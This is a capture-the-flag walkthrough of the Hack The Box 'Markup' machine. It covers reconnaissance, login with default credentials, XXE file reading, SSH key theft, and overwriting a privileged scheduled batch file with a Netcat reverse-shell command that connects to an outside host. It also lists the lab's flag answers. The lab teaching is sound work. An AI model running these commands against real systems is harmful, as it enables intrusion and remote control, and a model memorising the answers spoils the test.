# Markup (Tier 2)

## <mark style="color:blue;">Description</mark>

* **Tier&#x20;**<mark style="color:green;">**->**</mark> 2
* **Difficult** <mark style="color:green;">**->**</mark> Very Easy
* **OS** <mark style="color:green;">**->**</mark> Windows
* **Tags&#x20;**<mark style="color:green;">**->**</mark> Apache / SSH / PHP / Reconnaissance / Scheduled Job Abuse / Weak Credentials\
  &#x20;              / Arbitrary File Upload / XXE Injection / Weak Permissions

<figure><img src="../../.gitbook/assets/image (719).png" alt=""><figcaption><p><a href="https://app.hackthebox.com/starting-point?tier=1">https://app.hackthebox.com/starting-point?tier=2</a></p></figcaption></figure>

## <mark style="color:blue;">Write-up</mark>

* I started doing an initial scan with [_Nmap_](../../networks/tools-and-utilities.md#nmap)

<pre class="language-bash" data-line-numbers><code class="lang-bash"><strong>nmap 10.129.136.233 -p- -Pn --min-rate 2500 -oN scan.txt
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>

***

* Then to learn more about the services running on the open ports found, I did an exhaustive scan

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>nmap 10.129.136.233 -p22,80,443 -sVC -oN serv_scan.txt
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (114).png" alt=""><figcaption><p>snippet</p></figcaption></figure>

***

* With this, I answered the first question

<figure><img src="../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

> Answer: _**2.4.41**_

***

* I found the HTTP service running on port 80, so I went to the browser to explore the content and found a login page. I tried logging in with common credentials, and fortunately, using the combination of username _admin_ and password _password,_ I got in successfully to a new dashboard

<figure><img src="../../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about the HTTP protocol, you can go [here](../../networks/protocols/http/)
{% endhint %}

***

* With this, I answered the next question

<figure><img src="../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

> Answer: _**admin:password**_

***

* Then I explored the tabs of the website, where in the _Contact_ tab I found an email and a form for submission. Unfortunately, the form didn't work, so we went to the Order tab, which also had a form. After filling out that one and clicking on the _Submit_ button, it worked, giving me a pop-up informing the request had been sent&#x20;

<figure><img src="../../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>

***

* So to check how the request was being sent, I used [_FoxyProxy_](../../web-exploitation/tools-and-utilities.md#foxyproxy) and [_Burp Suite_](../../web-exploitation/tools-and-utilities.md#burp-suite) to intercept the request. I noticed a session cookie from _PHP,_ and what caught my attention was the fact that the site was sending the information using _XML_

<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

***

* With this and a little research, I answered the next questions

<figure><img src="../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

> Answer: _**order**_

***

<figure><img src="../../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>

> Answer: _**1.0**_

***

<figure><img src="../../.gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>

> Answer: _**XML External Entity**_

***

* To retrieve more information about this section, I checked the source code, finding a commentary from one of the developers with his name, which could be a user of the system. So, as I didn't find anything else interesting, I could use this information to modify the _XML_ of the petition

<figure><img src="../../.gitbook/assets/image (129).png" alt=""><figcaption><p>snippet</p></figcaption></figure>

***

* With this, I answered the next question

<figure><img src="../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

> Answer: _**Daniel**_

***

* I tried making a test for a possible XEE Injection, and it worked successfully, being able to retrieve the content of the _/etc/hosts_ Windows file. With this and the previous information found, I tried accessing the Desktop folder for the user _Daniel_ and reading the _user.txt_ file, which usually contains the user flag, and it worked

<figure><img src="../../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about XXE Injection, you can go [here](../../web-exploitation/web-vulnerabilities/xxe-injection-wip.md).
{% endhint %}

***

* So, I continued retrieving possible files that could help to gain access to the system as one of the users. Checking for configurations of the SSH protocol for _Daniel_, I found a file with the default name _id\_rsa,_ being this the private key for the user. So I used this to connect through SSH to the system as the Daniel user, and it worked

{% code overflow="wrap" lineNumbers="true" %}
```bash
ssh Daniel@10.129.136.233 -i ssh_key
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about the SSH protocol, you can go [here](../../networks/protocols/ssh.md)
{% endhint %}

***

* Once inside, I tried accessing a PowerShell and the system let me do it without any issue. Then I checked for the privileges of the user but didn't find anything relevant, so I continued exploring the system for a possible way to escalate privileges

<figure><img src="../../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>

***

* Exploring the root folder _C:\\_ I found a particular folder named _Log-Management,_ which is not a standard system file for _Windows_. So I accessed it and listed its content, finding a _job.bat_ file, and checking that, I saw it was a script that seemed to be a programmed task that was interacting with an executable named _wevtutil.exe_. Also, the script said that it could only be run with administrator permissions, letting us know it was being called with privileges&#x20;

<figure><img src="../../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>

***

* With this and the previously found user flag, I answered the next questions

<figure><img src="../../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>

> Answer: _**job.bat**_

***

<figure><img src="../../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>

> Answer: _**wevtutil.exe**_

***

<figure><img src="../../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>

> Answer: _**032d2fc8952a8c24e39c8f0ee9918ef7**_

***

* So I [searched](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil) about the functioning of this program, understanding that it was being called through the job to erase the logs of the system every so often. With this, I could check if the service was still running on the system and which permission it had, maybe letting us modify its content. So I checked, noticing it has full-control permissions for all the local users. Then I checked the current system processes and found the system was still using the program

{% code overflow="wrap" lineNumbers="true" %}
```powershell
icacls job.bat
ps
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (166).png" alt=""><figcaption><p>snippet</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (167).png" alt=""><figcaption><p>snippet</p></figcaption></figure>



***

* Knowing this, I could modify the content to possibly execute arbitrary programs or commands. So I tried using this to gain a Reverse Shell using a _Netcat_ executable, first downloading the corresponding file to our machine and importing it to the target machine

{% code overflow="wrap" lineNumbers="true" %}
```powershell
# In our machine
wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe #Get NC executable
python3 -m http.server 1234 # In the folder where we have the executable

# In the target machine
wget http://10.10.14.117:1234/nc64.exe -outfile nc64.exe
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn the details about the abuse of _.bat_ files for privilege escalation, you can go [here](../../penetration-testing/process-stages/post-exploitation/privilege-escalation/windows-privilege-escalation.md#abusing-.bat-files-with-full-control-permissions)
{% endhint %}

***

* Then I set up a listener on my machine to receive the connection and pass the payload to the job file to execute _Netcat_. The PowerShell gave me an error, so I tried closing it and doing it from the _CMD_, this time working properly, and checked the content of the file had been modified successfully. Then I waited for the script to be executed by the system, and after a while, the listener caught the shell as the _Administrator_ user

{% code overflow="wrap" lineNumbers="true" %}
```powershell
# In our machine
nc -nvlp 4444

# In the target machine
echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.14.117 4444 > C:\Log-Management\job.bat
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (716).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (717).png" alt=""><figcaption></figcaption></figure>

***

* Finally, I went to the Desktop folder of the _Administrator_ user, listing its content and noticing a _root.txt_ file, and reading its contents, I obtained the root flag

<figure><img src="../../.gitbook/assets/image (718).png" alt=""><figcaption></figcaption></figure>

***

* With this, I got the root flag and pwned the machine

<figure><img src="../../.gitbook/assets/image (245) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**f574a3e7650cebd8c39784299cb570f8**_
